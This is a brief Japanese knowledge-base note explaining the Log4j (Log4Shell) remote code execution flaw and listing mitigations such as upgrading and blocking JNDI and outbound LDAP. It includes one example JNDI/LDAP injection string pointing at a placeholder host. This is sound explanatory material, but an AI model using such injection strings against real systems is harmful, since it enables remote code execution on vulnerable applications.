---
CVSS Score: 10.0 (Critical)
Vulnerability Type: Remote Code Execution (RCE)
---
## 概要
Java向けlog処理フレームワークのLog4jのゼロディ脆弱性、攻撃者のインジェクションによってLog4jを使用するアプリに任意のコードを実行させることができる。

## 仕組み
Log4jの文字列埋め込み機能(String substitution)を利用し、定型文に変数を埋め込むことができ
`logger.info("User {} logged in", username)`
さらに、変数として、実行できるコード(`${}`とマーク）を埋め込むことができる
`logger.info("Current user: ${sys:user.name}")`

攻撃者は、例えば悪意のコードを仕込んだサーバに対するLDAP依頼を仕込んだコードをインジェクトすれば、ログとして表示される時に実行され、悪意のあるコードをダウンロードし、実行することがある
`${jndi:ldap://example.com/data}`

## 対策
1. Log4jを脆弱性が修正された2.15.0以降のバージョンにアップデート
2. log4jのJNDI Lookupを禁止する、JNDI Lookupが通常業務に必要な環境では、最小限の許可リストを設定する
3. ネットワーク外向けの[[LDAP]],[[RMI]]コネクションを禁止する
4. WAFに攻撃行為を検知、ブロックするルールを追加git

![[URL#他のスキームのQuery]]